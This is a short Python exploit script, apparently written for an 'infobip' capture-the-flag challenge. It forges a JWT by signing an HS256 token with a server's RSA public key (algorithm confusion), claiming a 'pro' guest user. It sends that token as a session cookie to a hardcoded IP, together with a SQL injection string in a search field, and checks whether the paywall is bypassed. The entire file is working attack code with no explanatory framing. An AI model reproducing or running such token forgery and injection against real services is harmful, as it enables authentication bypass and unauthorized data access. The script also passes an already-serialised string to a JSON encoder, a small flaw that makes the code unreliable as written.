import requests
import base64
import hmac
import hashlib
import json
# infobip ctf
url = "http://3.64.222.103:8082/"


def encode(dictionary):
    return base64.urlsafe_b64encode(json.dumps(dictionary, separators=(",", ":")).encode()).decode('UTF-8').strip("=")


def genSig(key, data):
    return base64.urlsafe_b64encode(hmac.new(key.encode(), data.encode(), hashlib.sha256).digest()).decode('UTF-8').strip("=")


def jwtOut(token):
    resData = requests.post(url, cookies={"session": token}, data="search=Yaris' OR '1'='1", proxies={"http": "127.0.0.1:8080"}, verify=False)
    # print(resData.status_code)
    # print(len(resData.content))
    print("Content-length: ", len(resData.text))

    if "Search is available only to PRO users" not in resData.text:
        print("JWT accepted!")


def checkPubKeyExploit(paylB64, pubKey="rsa.pub"):
    key = open(pubKey).read()
    print(key)
    newHead = {}
    newHead["alg"] = "HS256"
    newHead["typ"] = "JWT"
    newTok = encode(newHead) + "." + paylB64
    newSig = genSig(key, newTok)
    return newTok, newSig


x = """{
  "user": "guest",
  "pro": true
}"""

newTok, newSig = checkPubKeyExploit(encode(x))
valid_jwt = newTok + "." + newSig
print(valid_jwt)
jwtOut(valid_jwt)



